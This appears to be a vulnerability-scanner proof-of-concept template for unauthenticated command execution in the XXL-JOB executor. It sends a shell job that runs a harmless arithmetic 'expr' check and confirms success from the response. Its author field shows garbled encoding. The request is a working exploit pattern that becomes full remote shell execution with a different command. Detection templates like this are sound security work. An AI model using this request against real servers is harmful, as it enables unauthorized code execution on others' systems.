name: poc-yaml-xxl-job-unauthorized-rce
transport: http
set:
    f1: randomInt(800000000, 900000000)
    f2: randomInt(800000000, 900000000)
rules:
    r1:
        request:
            method: POST
            path: "/run"
            headers:
                Content-Type: application/json
            body: |-
              {
                "jobId": 1,
                "executorHandler": "demoJobHandler",
                "executorParams": "demoJobHandler",
                "executorBlockStrategy": "COVER_EARLY",
                "executorTimeout": 0,
                "logId": 1,
                "logDateTime": 1586629003729,
                "glueType": "GLUE_SHELL",
                "glueSource": "expr {{f1}}+{{f2}}",
                "glueUpdatetime": 1586699003758,
                "broadcastIndex": 0,
                "broadcastTotal": 0
              }
        expression: response.status == 200 && response.body.bcontains(b"{\"code\":200}") && response.headers["content-length"].contains("12")
expression: r1()
detail:
    author: æ›¦shen
    links:
        - https://github.com/vulhub/vulhub/tree/master/xxl-job/unacc
